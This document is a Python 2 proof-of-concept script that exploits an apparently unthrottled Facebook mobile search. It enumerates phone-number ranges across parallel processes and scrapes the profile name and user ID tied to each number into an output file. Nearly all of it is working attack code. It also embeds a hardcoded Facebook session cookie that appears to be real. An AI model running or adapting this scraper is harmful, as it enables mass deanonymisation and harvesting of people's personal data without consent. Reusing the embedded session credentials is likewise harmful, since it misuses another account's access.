# Written by TurboBorland
# bug brought to me by Suriya
try:
	import socket, ssl, re, itertools
	from time import sleep
	from sys import argv
	from multiprocessing import Pool, Lock, active_children
except ImportError:	exit("Error importing modules. You may be using an older version of Python")

def usage(arg):
	print('''\nFacebook user/number association game!
Written by TurboBorland - Credits to Suriya for finding the hilarious no-rate issue
***You need to supply your own cookie values until I fix it. This is only quick hour-long PoC project***''')
	print("\n"+arg+"\n")
	exit('''-start\tThe starting number country code+area code+number (ex: 19205432221)
-end\tThe number to end on country code+area code+number (ex:19205432230)
-proc\tThe amount of concurrent processes to run at once (default 10)
-wait\tThe amount of time to wait between each individual grab (default 0)
-input\tRetrieve numbers from list
-output\tFile to output finds to (default found.lst)
-append\tToggle support to append to output file instead of overwrite (default is overwrite)\n''')

global wait
global timeout
global lock
global outputf
lock = Lock()
timeout = 8
wait = 0
proc = 10
inputf = 0
outputf = "found.lst"
append = 0
x = 0

if (len(argv) < 2):
	usage("At least provide a phone number range!")
for arg in argv:
	if (arg == "-start"):
		try:	startn = int(argv[x+1])
		except:	usage("-start not properly set")
	elif (arg == "-end"):
		try:	endn = int(argv[x+1])
		except:	usage("-end not properly set")
	elif (arg == "-proc"):
		try:	proc = int(argv[x+1])
		except:	usage("-proc not properly set")
	elif (arg == "-timeout"):
		try:	timeout = int(argv[x+1])
		except:	usage("-timeout not properly set")
	elif (arg == "-wait"):
		try:	wait = int(argv[x+1])
		except:	usage("-wait not properly set")
	elif (arg == "-input"):
		try:	inputf = open(str(argv[x+1]),"r").readlines()
		except IOError,e:	usage("-input file not properly set %s" % e)
	elif (arg == "-output"):
		try:	outputf = str(argv[x+1])
		except:	usage("-output not properly set %s" % e)
	elif (arg == "-append"):	append = 1
	x += 1

class getNumbers(object):
	def __init__(self,number,cookies):
		self.number = number
		self.cookies = cookies

	def run(self):
		self.findperson = re.compile("alt=\"Profile picture of ([\w\d ]+).*?friend.php\?id=(\d+)")
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.ssocket = ssl.wrap_socket(self.s)
		self.connmsg = self.ssocket.connect_ex(("m.facebook.com",443))
		while (self.connmsg != 0):
			print("Error connecting")
			sleep(2.1)
			self.connmsg = self.ssocket.connect_ex(("m.facebook.com",443))
		self.ssocket.send("GET /search/?query="+str(self.number)+" HTTP/1.1\r\nHost: m.facebook.com\r\n"+self.cookies+"\r\n\r\n")
		sleep(1)
		self.chunk = self.ssocket.recv(2048)
		self.trigger = 0
		if (self.chunk.find("200 OK") <= 0):
			print("Irregular response seen. You may be sending too fast, logged out, or banned")
			print(self.chunk)
			return 1
		while (self.chunk.find("Facebook @2012") <= 0 and (self.trigger != timeout)):
			sleep(1)
			self.chunk += self.ssocket.recv(400)
			self.trigger += 1
		self.ssocket.close()	
		self.foundone = self.findperson.findall(self.chunk)
		if (len(self.foundone) > 0):	
			print("Facebook number %d = %s" % (self.number,str(self.foundone[0])))
			lock.acquire()
			f = open(outputf,"a")
			f.write("Facebook number %d = %s\n" % (self.number,str(self.foundone[0])))
			f.close()
			lock.release()	
		return 0

def worker(numbers):
	cookies = "Cookie: datr=6tFoUKs6IWQTMn495dFCPZd3; fr=0rB8Q3jQU9XGXapUw.AWWKQSZUATLIUwh-UbSPP_XW1-8.BQaNJ2.mU.AWWcnNsR; lu=RAHduX6HDIasKjM-owpO8BSg; locale=en_US; c_user=100003499244594; xs=60%3AzXKlg8wQEwQ6Yw%3A0%3A1349626280"
        for number in numbers:
                #print("Trying %d" % number)
                while (getNumbers(number,cookies).run() != 0):     sleep(1)
		sleep(wait)

def grouper(iterable,n,fillvalue=None):
    it = iter(iterable)
    def take():
        while 1: yield list(itertools.islice(it,n))
    return iter(take().next,[])

if __name__ == "__main__":
	if (append != 1):
		try:	foundlist = open(outputf,"w").close()
		except IOError,e:	usage("-outputf not properly set %s" % e)
	if (inputf != 0):
		size = len(inputf)
	else:	size = (endn-startn)
	if (proc > size):	chunksize = 1
	else:	chunksize = (size / proc)
	print("Input size: %d\tChunk size: %d\tPool size: %d" % (size,chunksize,proc))
	pool = Pool(processes=proc)
	if (inputf != 0):
		for chunk in itertools.izip(grouper(inputf,chunksize)):  pool.map_async(worker,chunk)
        else:
		for chunk in itertools.izip(grouper(range(startn,(endn+1)),chunksize)):  pool.map_async(worker,chunk)
	pool.close()
        try:
                while(len(active_children()) > 0): # how many active children do we have
                        sleep(2)
                        ignore = active_children()
        except KeyboardInterrupt:       exit("CTRL^C caught, exiting...\n\n")
        print("Completed")
